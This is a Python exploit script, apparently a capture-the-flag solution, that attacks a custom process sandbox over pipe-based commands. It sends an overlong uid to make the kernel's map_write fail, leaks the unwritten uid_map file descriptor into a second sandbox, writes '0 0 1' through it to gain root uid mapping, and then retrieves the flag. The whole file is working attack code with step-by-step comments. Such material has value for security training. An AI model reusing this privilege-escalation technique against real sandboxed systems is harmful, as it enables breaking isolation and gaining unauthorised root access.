import struct
import os
import argparse
import time
import select

class SandboxClient:
    def __init__(self, stdin, stdout):
        self.stdin = open(stdin, 'wb', buffering=0)
        self.stdout = open(stdout, 'rb', buffering=0)

    def _send_command(self, cmd_type, data=b''):
        cmd = struct.pack('=B', cmd_type) + data
        self.stdin.write(cmd)

    def _read_response(self):
        res = self.stdout.read(1024)
        return res
    
    def read_all(self):
        fullres = b''
        while True:
            # Use select to check if there's data available to read
            ready, _, _ = select.select([self.stdout], [], [], 0.5)  # 0.5 second timeout
            if not ready:
                # No more data available to read
                break

            res = self.stdout.read(1024)
            if not res:
                # End of file reached
                break

            fullres += res

        return fullres
    
    def create_sandbox(self, uid, gid, elf_binary_path):
        # Prepare command data
        uid_bytes = uid.encode()
        gid_bytes = gid.encode()
        
        with open(elf_binary_path, 'rb') as f:
            elf_binary = f.read()
        
        data = struct.pack('=Q', len(uid_bytes)) + uid_bytes
        data += struct.pack('=Q', len(gid_bytes)) + gid_bytes
        data += struct.pack('=Q', len(elf_binary)) + elf_binary

        # Send CREATE command
        self._send_command(1, data)

        # Read response (assuming the sandbox returns a success/failure indicator)
        return self.read_all()

    def connect_sandbox(self, sandbox_id):
        # Prepare command data
        data = struct.pack('=i', sandbox_id)

        # Send CONNECT command
        self._send_command(2, data)

        # Read response
        return self.read_all()

    def communicate_sandbox(self, sandbox_id, message):
        # Prepare command data
        data = struct.pack('=i', sandbox_id) + message.encode()

        # Send COMMUNICATE command
        self._send_command(3, data)

        res = self.read_all()
        return res

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('stdin')
    parser.add_argument('stdout')
    args = parser.parse_args()
    client = SandboxClient(args.stdin, args.stdout)

    # First create a sandbox that will trigger a non-written uid_map fd to be leaked in the sandbox process.
    uid = "0" * 4095 # This is too long of a uid, and it will fail in map_write in the kernel.
    gid = "0"
    elf_binary_path = "./first_sandboxee"
    result = client.create_sandbox(uid, gid, elf_binary_path) # id = 0
    print(f"Create sandbox result: {result}")

    # Sleep a bit to let the sandbox start and set up the fds
    time.sleep(3)

    # Connect to the sandbox and which sets up the fds.
    result = client.connect_sandbox(0)
    print(f"Connect sandbox result: {result}")
    
    # Now create the second sandbox, the uid_map fd will leak into it. Make it legit
    uid = "1000"
    gid = "1000"
    elf2_binary_path = "./second_sandboxee"
    result = client.create_sandbox(uid, gid, elf2_binary_path)
    print(f"Create sandbox result: {result}")

    # Before connecting, give the sandboxed process time to set up its fds
    time.sleep(1)

    # Connect to the second sandbox, after the fds are set up
    result = client.connect_sandbox(1)
    print(f"Connect sandbox result: {result}")

    # Now the stdout of the sandbox should be the leaked fd.
    # We will write to it as a privileged process which will trigger the vulnerability.
    # This will allow us to map any uid to any uid.
    result = client.communicate_sandbox(1, "0 0 1")
    print(f"Communicate sandbox result: {result}")

    # Wake up the first sandbox, and get the flag.
    result = client.communicate_sandbox(0, "X")
    print(f"Communicate sandbox result: {result}")

    time.sleep(100)

if __name__ == "__main__":
    main()
